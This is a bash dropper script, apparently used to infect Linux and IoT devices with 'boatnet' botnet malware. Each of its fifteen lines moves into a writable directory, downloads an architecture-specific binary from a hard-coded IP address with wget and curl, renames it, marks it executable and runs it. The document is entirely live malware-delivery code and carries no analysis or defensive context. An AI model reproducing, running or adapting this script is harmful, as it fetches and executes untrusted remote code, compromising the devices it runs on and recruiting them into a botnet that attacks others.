#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.233.166.90/hiddenbin/boatnet.x86; curl -O http://185.233.166.90/hiddenbin/boatnet.x86;cat boatnet.x86 >WTF;chmod +x *;./WTF
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.233.166.90/hiddenbin/boatnet.mips; curl -O http://185.233.166.90/hiddenbin/boatnet.mips;cat boatnet.mips >WTF;chmod +x *;./WTF
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.233.166.90/hiddenbin/boatnet.arc; curl -O http://185.233.166.90/hiddenbin/boatnet.arc;cat boatnet.arc >WTF;chmod +x *;./WTF
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.233.166.90/hiddenbin/boatnet.i468; curl -O http://185.233.166.90/hiddenbin/boatnet.i468;cat boatnet.i468 >WTF;chmod +x *;./WTF
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.233.166.90/hiddenbin/boatnet.i686; curl -O http://185.233.166.90/hiddenbin/boatnet.i686;cat boatnet.i686 >WTF;chmod +x *;./WTF
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.233.166.90/hiddenbin/boatnet.x86_64; curl -O http://185.233.166.90/hiddenbin/boatnet.x86_64;cat boatnet.x86_64 >WTF;chmod +x *;./WTF
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.233.166.90/hiddenbin/boatnet.mpsl; curl -O http://185.233.166.90/hiddenbin/boatnet.mpsl;cat boatnet.mpsl >WTF;chmod +x *;./WTF
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.233.166.90/hiddenbin/boatnet.arm; curl -O http://185.233.166.90/hiddenbin/boatnet.arm;cat boatnet.arm >WTF;chmod +x *;./WTF
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.233.166.90/hiddenbin/boatnet.arm5; curl -O http://185.233.166.90/hiddenbin/boatnet.arm5;cat boatnet.arm5 >WTF;chmod +x *;./WTF
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.233.166.90/hiddenbin/boatnet.arm6; curl -O http://185.233.166.90/hiddenbin/boatnet.arm6;cat boatnet.arm6 >WTF;chmod +x *;./WTF
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.233.166.90/hiddenbin/boatnet.arm7; curl -O http://185.233.166.90/hiddenbin/boatnet.arm7;cat boatnet.arm7 >WTF;chmod +x *;./WTF
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.233.166.90/hiddenbin/boatnet.ppc; curl -O http://185.233.166.90/hiddenbin/boatnet.ppc;cat boatnet.ppc >WTF;chmod +x *;./WTF
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.233.166.90/hiddenbin/boatnet.spc; curl -O http://185.233.166.90/hiddenbin/boatnet.spc;cat boatnet.spc >WTF;chmod +x *;./WTF
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.233.166.90/hiddenbin/boatnet.m68k; curl -O http://185.233.166.90/hiddenbin/boatnet.m68k;cat boatnet.m68k >WTF;chmod +x *;./WTF
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.233.166.90/hiddenbin/boatnet.sh4; curl -O http://185.233.166.90/hiddenbin/boatnet.sh4;cat boatnet.sh4 >WTF;chmod +x *;./WTF
